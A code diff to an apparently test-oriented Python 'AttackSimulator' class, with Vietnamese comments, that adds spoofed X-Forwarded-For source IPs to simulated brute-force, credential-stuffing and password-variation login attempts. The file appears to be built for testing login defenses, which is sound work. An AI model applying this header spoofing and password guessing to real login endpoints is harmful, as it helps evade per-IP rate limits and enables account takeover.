@@ -29,7 +29,11 @@ class AttackSimulator:
     def get_random_user_agent(self):
         return random.choice(self.user_agents)
 
-    def login_attempt(self, username, password, delay=0.1):
+    def get_random_src_ip(self):
+        # Khu vực private network cho test đa IP
+        return f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
+
+    def login_attempt(self, username, password, delay=0.1, src_ip=None):
         """Thực hiện 1 login attempt"""
         if delay > 0:
             time.sleep(delay)
@@ -38,6 +42,9 @@ class AttackSimulator:
             'User-Agent': self.get_random_user_agent(),
             'Content-Type': 'application/x-www-form-urlencoded'
         }
+
+        if src_ip:
+            headers['X-Forwarded-For'] = src_ip
 
         data = {
             'username': username,
@@ -54,8 +61,9 @@ class AttackSimulator:
 
             timestamp = datetime.now().strftime('%H:%M:%S')
             status = " SUCCESS" if response.status_code == 302 else " FAILED"
+            ip_label = src_ip or '127.0.0.1'
 
-            print(f"[{timestamp}] Login: {username}/{password} - {status} ({response.status_code})")
+            print(f"[{timestamp}] Login: {username}/{password} from {ip_label} - {status} ({response.status_code})")
 
             return response.status_code == 302  # Redirect means success
 
@@ -82,7 +90,8 @@ class AttackSimulator:
         success_count = 0
         for i in range(attempts):
             password = random.choice(password_list)
-            if self.login_attempt(target_username, password, delay=0.5):
+            src_ip = self.get_random_src_ip()
+            if self.login_attempt(target_username, password, delay=0.5, src_ip=src_ip):
                 success_count += 1
                 print(f" SUCCESS! Found password: {password}")
                 break
@@ -114,7 +123,8 @@ class AttackSimulator:
         success_count = 0
         for i in range(attempts):
             username, password = random.choice(credentials_list)
-            if self.login_attempt(username, password, delay=0.3):
+            src_ip = self.get_random_src_ip()
+            if self.login_attempt(username, password, delay=0.3, src_ip=src_ip):
                 success_count += 1
                 print(f" SUCCESS! Valid credentials: {username}/{password}")
 
@@ -146,7 +156,8 @@ class AttackSimulator:
         success_count = 0
         for i in range(attempts):
             password = random.choice(variations)
-            if self.login_attempt(target_username, password, delay=0.1):  # Very fast
+            src_ip = self.get_random_src_ip()
+            if self.login_attempt(target_username, password, delay=0.1, src_ip=src_ip):  # Very fast
                 success_count += 1
                 print(f" SUCCESS! Password variation worked: {password}")
                 break
